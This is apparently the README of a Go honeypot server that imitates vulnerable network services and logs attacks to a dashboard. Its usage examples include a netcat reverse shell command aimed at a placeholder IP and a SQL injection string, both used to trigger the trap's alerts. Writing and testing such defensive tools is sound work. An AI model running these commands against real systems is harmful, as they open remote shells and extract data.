# 🔍 HoneyPot Server – A Multi-Protocol Cybersecurity Trap

This repository contains a powerful Go-based **HoneyPot Server**, designed to simulate vulnerable network services (SSH, HTTP, FTP, Telnet, DNS, MySQL, SMTP) and capture malicious activities. Perfect for cybersecurity enthusiasts, pentesters, or anyone looking to study attacker behavior in a controlled environment! 🌐🚨

## ✨ Features

✅ **Multi-Protocol Support**: Simulates SSH, HTTP, FTP, Telnet, DNS, MySQL, and SMTP services.  
✅ **Attack Detection**: Identifies brute force, SQL injections, reverse shells, and ransomware attempts.  
✅ **Interactive Dashboard**: Real-time logs, connection stats, and graphs (via Chart.js).  
✅ **Alert System**: Sends notifications to Discord and integrates with SIEM systems.  
✅ **Geo-Location**: Tracks attacker locations using IP-API.  
✅ **Logging**: Saves events in JSON (`honeypot.json`), raw payloads (`payloads.bin`), and stats (`stats.json`).  
✅ **Exportable Results**: Download logs as CSV from the dashboard.  
✅ **Customizable**: Configure ports, max connections, and external integrations via `config.json`.

## 🚀 Installation

### Prerequisites

This tool was developed and tested on Linux, macOS, and Windows. It requires Go and a few dependencies:

1️⃣ **Install Go**  
   - Download Go (version 1.18 or higher) from [golang.org](https://golang.org/dl/).  
   - Ensure Go is added to your PATH. Verify:  
     ```bash
     go version
     ```

2️⃣ **Install Dependencies**  
   The project uses external Go modules. They will be automatically installed when you build the project.

3️⃣ **Optional Tools for Testing**  
   - `netcat` (`nc`): For testing SSH, Telnet, SMTP.  
   - `curl`: For testing HTTP.  
   - `ftp`: For testing FTP.  
   - `mysql` client: For testing MySQL.  
   - `nslookup or dig`: For testing DNS.

### Clone and Setup

1️⃣ **Clone the Repository**  
   ```bash
   git clone https://github.com/ryuji4real/serverhoneypot.git
   cd honeypot-server
   ```

2️⃣ **Install Go Modules**  
   ```bash
   go mod tidy
   ```

3️⃣ **Configure the Honeypot**  
   Copy the example configuration file:  
   ```bash
   cp config.example.json config.json
   ```  
   Edit `config.json` to set your ports, Discord webhook, and SIEM endpoint (optional):  
   ```json
   {
       "ports": {
           "SSH": "2222",
           "HTTP": "8080",
           "FTP": "21",
           "Telnet": "23",
           "DNS": "5353",
           "MySQL": "3306",
           "SMTP": "2525"
       },
       "max_connections": 50,
       "discord_webhook": "your webhook",
       "siem_endpoint": "http://localhost:12345"
   }
   ```

4️⃣ **Build and Run**  
   ```bash
   go run main.go
   ```  
   **Note**: If you use ports below 1024 (e.g., 21, 23), run with `sudo`:  
   ```bash
   sudo go run main.go
   ```

## 🌐 Usage

### Test the Services

The honeypot simulates vulnerable services. Here’s how to interact with them:

- **SSH** (port 2222):  
  ```bash
  nc localhost 2222
  ```  
  Try commands like `whoami`, `dir`, `cat /secrets.txt`, or `exit`.

- **HTTP** (port 8080):  
  Open `http://localhost:8080` in a browser.  
  - Login with `user=admin`, `pass=weak123` to see a fake API key.  
  - Try SQL injection on `/api/users?id=1 OR 1=1`.

- **FTP** (port 21):  
  ```bash
  ftp localhost 21
  ```  
  Use `USER test`, `PASS test`, `LIST`, `RETR secrets.txt`, `QUIT`.

- **Telnet** (port 23):  
  ```bash
  telnet localhost 23
  ```  
  Enter a fake username/password (e.g., `test`/`test`).

- **DNS** (port 5353):  
  ```bash
  nslookup
  > server localhost
  > set port=5353
  > fake.com
  ```  
  Expected: Resolves to `10.0.0.1`.

- **MySQL** (port 3306):  
  ```bash
  mysql -h localhost -P 3306 -u root -p
  ```  
  Try `SELECT * FROM users;` to trigger a fake response.

- **SMTP** (port 2525):  
  ```bash
  nc localhost 2525
  ```  
  Use `EHLO test`, `MAIL FROM:<test@example.com>`, `RCPT TO:<admin@example.com>`, `QUIT`.

- **Dashboard** (port 9090):  
  Open `http://localhost:9090` to see real-time logs, stats, and graphs.  
  - Export logs as CSV via the "Exporter logs en CSV" link.

### Generated Files

- `honeypot.json`: Logs of all events in JSON format.  
- `stats.json`: Connection statistics.  
- `payloads.bin`: Raw payloads sent by clients.

## 💡 Usage Examples

### Simulate an SSH Attack
```bash
nc localhost 2222
```
- Type `nc -e /bin/sh 1.2.3.4 4444` to simulate a reverse shell attempt.  
- Check the dashboard (`http://localhost:9090`) for the alert.

### Test HTTP Login
Open `http://localhost:8080` in a browser:  
- Enter `user=admin`, `pass=weak123` → See "Welcome Admin".  
- Try wrong credentials → See "Access Denied".

### Monitor Attacks
- Open the dashboard (`http://localhost:9090`).  
- Perform actions on any service (e.g., SSH, HTTP).  
- Watch logs update in real-time with geo-location data.

## 💡 Fast, flexible, and powerful – your go-to tool for capturing attacker behavior! 🚀

## ⚠️ Warning

This honeypot simulates vulnerable services to attract attackers. **Do not expose it to the public internet** without proper precautions (e.g., behind a VPN or firewall), as it could be exploited by real attackers.
